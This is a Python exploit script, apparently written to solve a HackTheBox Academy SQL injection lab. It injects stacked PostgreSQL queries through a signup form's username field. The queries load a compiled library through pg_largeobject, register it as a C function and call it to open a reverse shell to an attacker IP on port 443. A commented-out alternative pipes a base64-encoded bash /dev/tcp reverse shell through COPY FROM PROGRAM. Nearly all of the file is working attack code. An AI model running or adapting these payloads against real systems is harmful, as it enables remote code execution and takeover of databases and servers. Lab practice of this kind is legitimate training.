#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Command Execution' for the module called 'Advanced SQL Injections'. 
This script exploits a blind stacked PostgreSQL injection to get a reverse shell.  There are 2 ways to do this here: 
1) Use 'CREATE' and 'COPY' commands to create a reverse shell file on the target server, and then make use of PostgreSQL's 'PROGRAM' command to run the file. 
2) Create a PostgreSQL extension which is then used to get a reverse shell. 
The script below makes use of the second method, creating a PostgreSQL extension to get a reverse shell.  The first method is in the code but commented out.  
Open a netcat listener for port 443 and update the ip address in the variable 'end_data' before running the script
"""

import random
import string
import requests
import urllib.parse
import os

target= "10.129.204.249:8080" # Change this
proxies= {"http":"http://127.0.0.1:8081"} # Change this
headers= {"Content-Type": "application/x-www-form-urlencoded"}
full_content=""

def generate_random_number():
    all_nums= string.digits
    random_num= random.sample(all_nums, 6)
    return ''.join(random_num)

random_num= generate_random_number()

def generate_random_word():
    all_chars= string.digits + string.ascii_letters
    random_group = random.sample(all_chars, 16)
    return ''.join(random_group)

random_group = generate_random_word()

def list_files():
    dir= "/home/test/" # Create the correct files for the rev shell and put into this directory
    files = os.listdir(dir)
    files = [f for f in files if os.path.isfile(os.path.join(dir, f))]
    files.sort()
    return files
    
def create_content():
    file_list= list_files()
    random_num= generate_random_number()
    dir= "/home/test/"
    count=0
    full_content= ""
    
    beg_data=f"SELECT+lo_create({random_num});"
    full_content += beg_data
    
    for file in file_list:
        with open(f"{dir}/{file}","r") as source_file:
            content= source_file.read().rstrip('\n')

        mytemplate= f"INSERT+INTO+pg_largeobject+(loid,pageno,data)+VALUES+({random_num},{count},DECODE('{content}','HEX'));"
        full_content += mytemplate
        count += 1

    end_data= f"SELECT+lo_export({random_num},$$/tmp/rev$$);CREATE+FUNCTION+rev_shell(text,+integer)+RETURNS+integer+AS+$$/tmp/rev$$,+$$rev_shell$$+LANGUAGE+C+STRICT;SELECT+rev_shell($$10.10.18.111$$,443);"
    
    full_content += end_data
    return full_content

full_content= create_content()

payload= f"{full_content}"

# The commented out payload below is a different way to get a reverse shell. The base64 string below is base64 of a reverse shell command. If using the below payload, ensure to update the IP address in the base64 string before running the script.  
#payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/tmp/test.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/test.sh';copy+{random_group}+from+program+'/tmp/test.sh'"

data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload};--+-&email={random_group}@a.com&password=test&repeatPassword=test"

response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
